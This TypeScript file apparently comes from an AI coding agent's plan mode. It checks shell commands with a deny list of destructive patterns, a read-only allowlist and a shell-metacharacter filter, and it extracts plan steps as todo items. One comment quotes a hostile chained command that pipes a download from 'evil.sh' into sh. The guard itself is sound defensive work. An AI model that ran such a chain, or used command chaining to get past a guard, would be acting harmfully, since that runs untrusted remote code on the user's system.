/**
 * Pure utility functions for plan mode.
 * Ported from the MIT-licensed Pi plan-mode example (earendil-works/pi).
 */

const DESTRUCTIVE_PATTERNS = [
	/\brm\b/i,
	/\brmdir\b/i,
	/\bmv\b/i,
	/\bcp\b/i,
	/\bmkdir\b/i,
	/\btouch\b/i,
	/\bchmod\b/i,
	/\bchown\b/i,
	/\bchgrp\b/i,
	/\bln\b/i,
	/\btee\b/i,
	/\btruncate\b/i,
	/\bdd\b/i,
	/\bshred\b/i,
	/(^|[^<])>(?!>)/,
	/>>/,
	/\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
	/\byarn\s+(add|remove|install|publish)/i,
	/\bpnpm\s+(add|remove|install|publish)/i,
	/\bpip\s+(install|uninstall)/i,
	/\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
	/\bbrew\s+(install|uninstall|upgrade)/i,
	/\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dD]|stash|cherry-pick|revert|tag|init|clone)/i,
	/\bsudo\b/i,
	/\bsu\b/i,
	/\bkill\b/i,
	/\bpkill\b/i,
	/\bkillall\b/i,
	/\breboot\b/i,
	/\bshutdown\b/i,
	/\bsystemctl\s+(start|stop|restart|enable|disable)/i,
	/\bservice\s+\S+\s+(start|stop|restart)/i,
	/\b(vim?|nano|emacs|code|subl)\b/i,
];

/**
 * 参数本身不提供执行或输出文件能力的只读命令。
 *
 * `env`、`less`、`more` 不在这里：env 是任意命令包装器，less 能用 `-o` 写日志，
 * 两个 pager 在无交互子进程里还容易挂住。带高风险参数的命令走下面各自的策略。
 */
const SIMPLE_READONLY_COMMANDS = new Set([
	"cat",
	"head",
	"tail",
	"grep",
	"ls",
	"pwd",
	"echo",
	"printf",
	"wc",
	"diff",
	"file",
	"stat",
	"du",
	"df",
	"which",
	"whereis",
	"type",
	"printenv",
	"uname",
	"whoami",
	"id",
	"date",
	"cal",
	"uptime",
	"ps",
	"free",
	"jq",
	"rg",
	"bat",
	"eza",
]);

/**
 * shell 元字符：出现即拒绝。
 *
 * 这是本文件安全性的关键。仅靠 `^\s*cmd` 锚定第一个词是不够的 ——
 * `grep x . && curl evil.sh | sh` 的第一个词是 grep，却能执行任意代码。
 * 与其枚举所有危险的下游命令（denylist 永远不完整），不如先拒绝一切
 * 能引入「第二条命令」的结构，再对单条命令做允许清单。
 *
 * 命令替换 `$(...)`、反引号、管道、`&&`、`||`、`;`、换行、重定向全在此列。
 */
const SHELL_METACHARS = /[|&;<>`\n\r]|\$\(|\$\{/;

/**
 * 单条命令自带的破坏性参数。
 * 这些命令在允许清单里，但特定参数会让它们产生写操作或执行子命令。
 */
const FIND_SIDE_EFFECT_FLAGS = new Set([
	"-delete",
	"-exec",
	"-execdir",
	"-ok",
	"-okdir",
	"-fls",
	"-fprint",
	"-fprintf",
	"-fputs",
]);

const GIT_READONLY_SUBCOMMANDS = new Set(["status", "log", "diff", "show", "ls-files", "ls-tree"]);
const GIT_CONFIG_READ_ACTIONS = new Set(["--get", "--get-all", "--get-regexp", "--get-urlmatch"]);
const GIT_DANGEROUS_READ_FLAGS = new Set(["--ext-diff", "--textconv", "--edit"]);

/**
 * 最小 shell words 解析器。
 *
 * 元字符已经在调用前整体拒绝，这里只需要正确处理引号与反斜杠，目的是让参数检查
 * 看见真实的 argv。解析失败（例如引号没闭合）时返回 undefined，按不安全处理。
 */
function splitShellWords(command: string): string[] | undefined {
	const words: string[] = [];
	let current = "";
	let quote: "'" | '"' | undefined;
	let escaped = false;
	let started = false;

	for (const ch of command) {
		if (escaped) {
			current += ch;
			escaped = false;
			started = true;
			continue;
		}
		if (ch === "\\" && quote !== "'") {
			escaped = true;
			started = true;
			continue;
		}
		if (quote) {
			if (ch === quote) {
				quote = undefined;
			} else {
				current += ch;
			}
			started = true;
			continue;
		}
		if (ch === "'" || ch === '"') {
			quote = ch;
			started = true;
			continue;
		}
		if (/\s/.test(ch)) {
			if (started) {
				words.push(current);
				current = "";
				started = false;
			}
			continue;
		}
		current += ch;
		started = true;
	}

	if (escaped || quote) {
		return undefined;
	}
	if (started) {
		words.push(current);
	}
	return words;
}

function hasOutputOption(args: string[]): boolean {
	return args.some(
		(arg) =>
			arg === "-o" ||
			arg.startsWith("--output=") ||
			arg === "--output" ||
			(/^-[^-]/.test(arg) && arg.slice(1).includes("o")),
	);
}

function isSafeFind(args: string[]): boolean {
	return !args.some((arg) => FIND_SIDE_EFFECT_FLAGS.has(arg.toLowerCase()));
}

function isSafeFd(args: string[]): boolean {
	return !args.some((arg) => {
		const lower = arg.toLowerCase();
		return (
			lower === "--exec" ||
			lower.startsWith("--exec=") ||
			lower === "--exec-batch" ||
			lower.startsWith("--exec-batch=") ||
			(/^-[^-]/.test(arg) && /[xX]/.test(arg.slice(1)))
		);
	});
}

function isSafeSed(args: string[]): boolean {
	let index = 0;
	let quiet = false;
	while (index < args.length && args[index]?.startsWith("-")) {
		const option = args[index];
		if (option === "-n" || option === "--quiet" || option === "--silent") {
			quiet = true;
			index++;
			continue;
		}
		return false;
	}
	if (!quiet) {
		return false;
	}
	const script = args[index];
	if (!script) {
		return false;
	}
	// 只允许按行号查看。复杂 sed 表达式可用 rg/read 代替，不能拿安全边界赌解析完整性。
	if (!/^(?:\d+|\$)?(?:,(?:\d+|\$))?[pPl=]$/.test(script)) {
		return false;
	}
	return args.slice(index + 1).every((arg) => arg !== "" && !arg.startsWith("-"));
}

function isSafeGit(args: string[]): boolean {
	const subcommand = args[0]?.toLowerCase();
	if (!subcommand) {
		return false;
	}
	if (subcommand === "remote") {
		return args.length === 1 || (args.length === 2 && args[1] === "-v");
	}
	if (subcommand === "config") {
		const action = args[1]?.toLowerCase();
		return action !== undefined && GIT_CONFIG_READ_ACTIONS.has(action) && !args.slice(2).includes("--edit");
	}
	if (!GIT_READONLY_SUBCOMMANDS.has(subcommand)) {
		return false;
	}
	const rest = args.slice(1).map((arg) => arg.toLowerCase());
	if (rest.some((arg) => GIT_DANGEROUS_READ_FLAGS.has(arg))) {
		return false;
	}
	return !hasOutputOption(rest);
}

function isSafePackageQuery(command: string, args: string[]): boolean {
	const subcommand = args[0]?.toLowerCase();
	if (command === "npm") {
		if (!subcommand || !new Set(["list", "ls", "view", "info", "search", "outdated", "audit"]).has(subcommand)) {
			return false;
		}
		return subcommand !== "audit" || !args.slice(1).some((arg) => arg === "fix" || arg === "--fix");
	}
	if (command === "yarn") {
		return subcommand !== undefined && new Set(["list", "info", "why", "audit"]).has(subcommand);
	}
	return false;
}

function isSafeParsedCommand(words: string[]): boolean {
	const [rawCommand, ...args] = words;
	const command = rawCommand?.toLowerCase();
	if (!command) {
		return false;
	}
	if (SIMPLE_READONLY_COMMANDS.has(command)) {
		return true;
	}
	if (command === "find") {
		return isSafeFind(args);
	}
	if (command === "fd") {
		return isSafeFd(args);
	}
	if (command === "sed") {
		return isSafeSed(args);
	}
	if (command === "sort" || command === "uniq" || command === "tree") {
		return !hasOutputOption(args);
	}
	if (command === "git") {
		return isSafeGit(args);
	}
	if (command === "npm" || command === "yarn") {
		return isSafePackageQuery(command, args);
	}
	if (command === "node" || command === "python" || command === "python3") {
		return args.length === 1 && (args[0] === "--version" || args[0] === "-V");
	}
	return false;
}

/**
 * 判断命令在 plan 模式下是否安全（只读）。
 *
 * 三道关卡，全部通过才放行：
 * 1. 不含 shell 元字符（否则能拼接第二条命令）
 * 2. 不匹配任何破坏性命令模式
 * 3. 匹配某条允许清单，且不带该命令自身的破坏性参数
 */
export function isSafeCommand(command: string): boolean {
	if (typeof command !== "string" || command.trim() === "") {
		return false;
	}
	if (SHELL_METACHARS.test(command)) {
		return false;
	}
	if (DESTRUCTIVE_PATTERNS.some((p) => p.test(command))) {
		return false;
	}
	const words = splitShellWords(command);
	return words !== undefined && isSafeParsedCommand(words);
}

export interface TodoItem {
	step: number;
	text: string;
	completed: boolean;
}

export function cleanStepText(text: string): string {
	let cleaned = text
		.replace(/\*{1,2}([^*]+)\*{1,2}/g, "$1")
		.replace(/`([^`]+)`/g, "$1")
		.replace(
			/^(Use|Run|Execute|Create|Write|Read|Check|Verify|Update|Modify|Add|Remove|Delete|Install)\s+(the\s+)?/i,
			"",
		)
		.replace(/\s+/g, " ")
		.trim();

	if (cleaned.length > 0) {
		cleaned = cleaned.charAt(0).toUpperCase() + cleaned.slice(1);
	}
	if (cleaned.length > 50) {
		cleaned = `${cleaned.slice(0, 47)}...`;
	}
	return cleaned;
}

export function extractTodoItems(message: string): TodoItem[] {
	const items: TodoItem[] = [];
	const headerMatch = message.match(/\*{0,2}Plan:\*{0,2}\s*\n/i);
	if (!headerMatch) return items;

	const planSection = message.slice(message.indexOf(headerMatch[0]) + headerMatch[0].length);
	const numberedPattern = /^\s*(\d+)[.)]\s+\*{0,2}([^*\n]+)/gm;

	for (const match of planSection.matchAll(numberedPattern)) {
		const text = match[2]
			.trim()
			.replace(/\*{1,2}$/, "")
			.trim();
		// 长度阈值 >=3：兼容较短的中文步骤（如"添加测试"），同时过滤无意义碎片
		if (text.length >= 3 && !text.startsWith("`") && !text.startsWith("/") && !text.startsWith("-")) {
			const cleaned = cleanStepText(text);
			if (cleaned.length >= 2) {
				items.push({ step: items.length + 1, text: cleaned, completed: false });
			}
		}
	}
	return items;
}

export function extractDoneSteps(message: string): number[] {
	const steps: number[] = [];
	for (const match of message.matchAll(/\[DONE:(\d+)\]/gi)) {
		const step = Number(match[1]);
		if (Number.isFinite(step)) steps.push(step);
	}
	return steps;
}

export function markCompletedSteps(text: string, items: TodoItem[]): number {
	const doneSteps = extractDoneSteps(text);
	for (const step of doneSteps) {
		const item = items.find((t) => t.step === step);
		if (item) item.completed = true;
	}
	return doneSteps.length;
}
